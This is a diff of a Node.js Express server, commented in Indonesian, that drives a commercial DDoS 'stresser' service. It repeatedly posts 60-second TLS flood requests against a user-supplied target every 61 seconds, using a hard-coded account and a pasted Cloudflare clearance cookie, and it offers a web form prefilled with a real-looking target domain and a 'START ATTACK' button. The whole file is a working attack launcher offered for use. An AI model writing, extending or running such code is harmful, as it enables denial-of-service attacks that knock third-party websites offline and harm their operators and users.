@@ -2,180 +2,113 @@ const express = require('express');
 const axios = require('axios');
 
 const app = express();
+const PORT = process.env.PORT || 3000;
+
+// Middleware untuk baca JSON Body
 app.use(express.json());
+app.use(express.urlencoded({ extended: true })); // Penting untuk Form HTML
 
 // Konfigurasi
-const VIOLET_API_URL = "https://violetstresser.me/api/attack";
-const DEFAULT_USER = "vh7788";
-const LOOP_INTERVAL_MS = 61000; // 61 Detik
+const VIOLET_API = "https://violetstresser.me/api/attack";
+const USER = "vh7788";
+let activeSession = null;
 
-// Global State untuk menyimpan sesi attack yang sedang berjalan
-let currentSession = null;
-
-// Helper: Headers Request
-const getHeaders = (cookie) => ({
-    "Host": "violetstresser.me",
-    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
-    "Content-Type": "application/json",
-    "Accept": "*/*",
-    "Origin": "https://violetstresser.me",
-    "Referer": "https://violetstresser.me/hub",
-    "Cookie": cookie,
-    "sec-ch-ua-mobile": "?1",
-    "sec-ch-ua-platform": '"Android"'
-});
-
-// Fungsi Kirim Attack ke Violet
-async function sendVioletAttack(target, cookie) {
+// Fungsi Kirim Request
+async function hitViolet(target, cookie) {
     try {
-        const payload = {
-            username: DEFAULT_USER,
+        const res = await axios.post(VIOLET_API, {
+            username: USER,
             host: target,
             port: "443",
             time: 60,
             method: "TLS",
             concurrents: 1
-        };
-
-        const res = await axios.post(VIOLET_API_URL, payload, {
-            headers: getHeaders(cookie),
+        }, {
+            headers: {
+                "Host": "violetstresser.me",
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
+                "Content-Type": "application/json",
+                "Cookie": cookie,
+                "Origin": "https://violetstresser.me",
+                "Referer": "https://violetstresser.me/hub"
+            },
             timeout: 10000
         });
-
-        if (res.status === 200 && res.data.success) {
-            return { success: true, endTime: res.data.data?.endTime };
-        } else if (res.status === 403) {
-            return { success: false, error: "Cookie Expired (403)" };
-        } else {
-            return { success: false, error: `HTTP ${res.status}` };        }
-    } catch (err) {
-        return { success: false, error: err.message };
+        return res.data;
+    } catch (e) {
+        return { success: false, error: e.message };
     }
 }
 
-// Fungsi Looping Otomatis
-function startAutoLoop(target, cookie) {
-    // Reset session
-    currentSession = {
-        target: target,
-        isActive: true,
-        loops: 0,
-        lastResult: null
-    };
-
-    console.log(`[SYSTEM] Auto-Loop Started for: ${target}`);
-
+// Loop Otomatis
+function startLoop(target, cookie) {
+    if (activeSession) activeSession.active = false; // Stop sesi lama
+    
+    activeSession = { target, cookie, active: true, count: 0, lastRes: null };
+    
+    console.log(`[START] Looping for ${target}`);
     const loop = async () => {
-        if (!currentSession || !currentSession.isActive) {
-            console.log("[SYSTEM] Loop Stopped.");
-            return;
-        }
+        if (!activeSession || !activeSession.active) return;
 
-        currentSession.loops++;
-        console.log(`[LOOP #${currentSession.loops}] Sending attack...`);
-
-        const result = await sendVioletAttack(target, cookie);
-        currentSession.lastResult = result;
+        activeSession.count++;
+        console.log(`[LOOP #${activeSession.count}] Hitting...`);
+        
+        const result = await hitViolet(target, cookie);
+        activeSession.lastRes = result;
 
         if (!result.success) {
-            console.log(`[ERROR] ${result.error}. Stopping loop.`);
-            currentSession.isActive = false;
+            console.log("[STOP] Failed:", result.error);
+            activeSession.active = false;
         } else {
-            console.log(`[OK] Success. Next in 61s...`);
-            // Jadwalkan loop berikutnya
-            setTimeout(loop, LOOP_INTERVAL_MS);
+            setTimeout(loop, 61000); // Ulangi setelah 61 detik
         }
     };
 
-    // Jalankan loop pertama segera
-    loop();
+    loop(); // Jalankan pertama kali
 }
 
-// --- ENDPOINTS ---
+// --- ROUTES ---
 
-// 1. START ATTACK (Input Target & Cookie Langsung Disini)
-// Cara Pakai: POST /start?target=https://site.com&cookie=cf_clearance=xxx
-// ATAU via Body JSON: { "target": "...", "cookie": "..." }
-app.post('/start', (req, res) => {
-    // Ambil dari Body (Form HTML) atau Query/JSON
-    let target = req.body.target || req.query.target;
-    let cookie = req.body.cookie || req.query.cookie;
-
-    if (!target || !cookie) {
-        return res.status(400).send("Error: Missing target or cookie");
-    }
-
-    if (!target.startsWith("http")) target = "https://" + target;
-
-    if (currentSession && currentSession.isActive) {
-        currentSession.isActive = false;
-    }
-
-    startAutoLoop(target, cookie);
-
-    res.send(`
-        <h1>✅ Attack Started!</h1>
-        <p><strong>Target:</strong> ${target}</p>
-        <p><strong>Status:</strong> Running (Loop every 61s)</p>
-        <p><a href="/status">Check Status</a> | <a href="/stop">Stop Attack</a></p>
-    `);
-});
-
-// 2. STOP ATTACK
-app.get('/stop', (req, res) => {
-    if (currentSession && currentSession.isActive) {
-        currentSession.isActive = false;
-        res.send("<h1>🛑 Attack Stopped.</h1><p><a href='/'>Home</a></p>");
-    } else {
-        res.send("<h1>⚠️ No active attack found.</h1><p><a href='/'>Home</a></p>");
-    }
-});
-
-// 3. CHECK STATUS (Tampilan Web Sederhana)
-app.get('/status', (req, res) => {
-    if (!currentSession) {
-        return res.send("<h1>ℹ️ No Session History</h1>");
-    }
-
-    const statusColor = currentSession.isActive ? "green" : "red";
-    const statusText = currentSession.isActive ? "RUNNING 🟢" : "STOPPED 🔴";
-
-    res.send(`        <h1>📊 Attack Status</h1>
-        <p><strong>Status:</strong> <span style="color:${statusColor}; font-weight:bold;">${statusText}</span></p>
-        <p><strong>Target:</strong> ${currentSession.target}</p>
-        <p><strong>Loops Completed:</strong> ${currentSession.loops}</p>
-        <p><strong>Last Result:</strong> ${JSON.stringify(currentSession.lastResult)}</p>
-        <hr>
-        <p><a href="/stop">Stop Attack</a> | <a href="/">Home</a></p>
-    `);
-});
-
-// Home Page
-// Home Page dengan Form Input (Lebih Mudah daripada URL Panjang)
+// 1. Halaman Utama (Form Input)
 app.get('/', (req, res) => {
     res.send(`
-        <html>
-        <head><title>Violet Stresser API</title></head>
-        <body style="font-family:sans-serif; padding:20px; background:#121212; color:white;">
-            <h1>🚀 Violet Stresser Easy Start</h1>
-            <form action="/start" method="POST">
-                <label>Target URL:</label><br>
-                <input type="text" name="target" value="https://kartutoto.com/" style="width:100%; padding:10px; margin-bottom:10px;"><br>
-                
-                <label>Cookie (cf_clearance):</label><br>
-                <textarea name="cookie" placeholder="Paste cf_clearance=... here" style="width:100%; height:100px; padding:10px; margin-bottom:10px;"></textarea><br>
-                
-                <button type="submit" style="padding:15px 30px; background:green; color:white; border:none; cursor:pointer;">START ATTACK</button>
-            </form>
-            <hr>
-            <p><a href="/status" style="color:cyan;">Check Status</a> | <a href="/stop" style="color:red;">Stop Attack</a></p>
-        </body>
-        </html>
+        <html><body style="background:#111; color:#fff; font-family:sans-serif; padding:20px;">
+        <h1>🚀 Violet Stresser API</h1>
+        <form action="/start" method="POST">
+            <p>Target:</p>
+            <input type="text" name="target" value="https://kartutoto.com/" style="width:100%; padding:10px; margin-bottom:10px;">
+            <p>Cookie (cf_clearance):</p>
+            <textarea name="cookie" placeholder="Paste full cf_clearance=..." style="width:100%; height:100px; padding:10px; margin-bottom:10px;"></textarea>
+            <br>
+            <button type="submit" style="padding:15px 30px; background:green; color:white; border:none; cursor:pointer;">START ATTACK</button>
+        </form>
+        <hr>
+        <a href="/status" style="color:cyan;">Status</a> | <a href="/stop" style="color:red;">Stop</a>
+        </body></html>
     `);
 });
 
-// Start Server
-const PORT = process.env.PORT || 3000;
+// 2. Start Attack (Terima dari Form POST)
+app.post('/start', (req, res) => {
+    const { target, cookie } = req.body;
+    if (!target || !cookie) return res.send("❌ Missing Target or Cookie");
+    
+    startLoop(target.startsWith('http') ? target : 'https://' + target, cookie);
+    res.send("<h1>✅ Attack Started!</h1><p>Check <a href='/status'>Status</a></p>");
+});
+// 3. Status
+app.get('/status', (req, res) => {
+    if (!activeSession) return res.send("ℹ️ No active session.");
+    res.json(activeSession);
+});
+
+// 4. Stop
+app.get('/stop', (req, res) => {
+    if (activeSession) activeSession.active = false;
+    res.send("🛑 Stopped.");
+});
+
+// Jalankan Server
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
